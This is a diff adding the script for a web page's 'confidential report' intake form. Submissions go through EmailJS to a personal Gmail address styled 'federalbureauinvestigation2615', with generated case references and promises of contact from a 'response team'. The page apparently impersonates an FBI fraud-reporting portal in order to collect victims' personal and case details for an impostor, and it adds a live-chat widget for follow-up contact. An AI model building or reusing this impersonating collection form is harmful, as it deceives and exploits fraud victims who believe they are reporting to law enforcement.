+   ===================================================================== */
+const EMAILJS_PUBLIC_KEY  = "PYZhrK9im0SfBOGVE";
+const EMAILJS_SERVICE_ID  = "service_9e1v5lq";
+const EMAILJS_TEMPLATE_ID = "template_9myx7vl";
+const RECIPIENT_EMAIL     = "federalbureauinvestigation2615@gmail.com";
+/* ===================================================================== */
+
+emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY });
+
+/* =========================================================
+   SHARED HELPERS
+   ========================================================= */
+function generateRef(prefix) {
+  const y = new Date().getFullYear();
+  const r = Math.random().toString(36).slice(2, 7).toUpperCase();
+  return `${prefix}-${y}-${r}`;
+}
+document.getElementById('year').textContent = new Date().getFullYear();
+
+/* =========================================================
+   INTAKE FORM
+   ========================================================= */
+const form      = document.getElementById('reportForm');
+const statusEl  = document.getElementById('formStatus');
+const submitBtn = document.getElementById('submitBtn');
+const btnLabel  = submitBtn.querySelector('.btn-label');
+
+let caseRef = generateRef('CF');
+document.getElementById('reference_id').value = caseRef;
+document.getElementById('refDisplay').textContent = caseRef;
+document.getElementById('to_email').value = RECIPIENT_EMAIL;
+
+function showStatus(type, html) {
+  statusEl.className = 'status show ' + type;
+  statusEl.innerHTML = html;
+  statusEl.scrollIntoView({ behavior: 'smooth', block: 'center' });
+}
+function clearStatus() {
+  statusEl.className = 'status';
+  statusEl.innerHTML = '';
+}
+
+form.addEventListener('submit', function (e) {
+  e.preventDefault();
+  clearStatus();
+
+  if (!form.checkValidity()) {
+    form.reportValidity();
+    showStatus('err', '⚠️ Please complete all required fields before submitting.');
+    return;
+  }
+
+  submitBtn.disabled = true;
+  submitBtn.classList.add('loading');
+  btnLabel.textContent = 'Transmitting Securely…';
+
+  emailjs.sendForm(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, form)
+    .then(function () {
+      showStatus(
+        'ok',
+        `✅ <strong>Report received.</strong> Your case reference is
+         <strong>${caseRef}</strong>. A member of our response team will review
+         your submission and contact you using your preferred method. Please keep
+         this reference number for your records.`
+      );
+
+      form.reset();
+
+      caseRef = generateRef('CF');
+      document.getElementById('reference_id').value = caseRef;
+      document.getElementById('refDisplay').textContent = caseRef;
+      document.getElementById('to_email').value = RECIPIENT_EMAIL;
+    })
+    .catch(function (err) {
+      console.error('EmailJS error:', err);
+      showStatus(
+        'err',
+        `❌ <strong>Submission failed.</strong> We could not transmit your report.
+         Please check your connection and try again, or email us directly at
+         <a href="mailto:${RECIPIENT_EMAIL}">${RECIPIENT_EMAIL}</a>.`
+      );
+    })
+    .finally(function () {
+      submitBtn.disabled = false;
+      submitBtn.classList.remove('loading');
+      btnLabel.textContent = 'Submit Confidential Report';
+    });
+});
+
+/* =========================================================
+   LIVE CHAT — MyLiveChat
+   The chat widget is injected by the script tag placed just
+   before </body>. This handler wires the hero button to it.
+   ========================================================= */
+document.getElementById('heroChatBtn').addEventListener('click', function () {
+  try {
+    if (typeof window.MyLiveChat_OpenChatBox === 'function') {
+      window.MyLiveChat_OpenChatBox();
+      return;
+    }
+    if (typeof window.MyLiveChat_StartChat === 'function') {
+      window.MyLiveChat_StartChat();
+      return;
+    }
+  } catch (err) {
+    /* fall through to the form */
+  }
+  document.getElementById('report').scrollIntoView({ behavior: 'smooth' });
+});
+</script>
+
+<!-- ============================ LIVE CHAT (MyLiveChat) ============================ -->
+<!--Add the following script at the bottom of the web page (before </body></html>)-->
+<script type="text/javascript" async="async" defer="defer" data-cfasync="false" referrerpolicy="origin" src="https://www.mylivechat.com/chatbutton.aspx?hccid=10962436"></script>
+
+</body>
+</html>
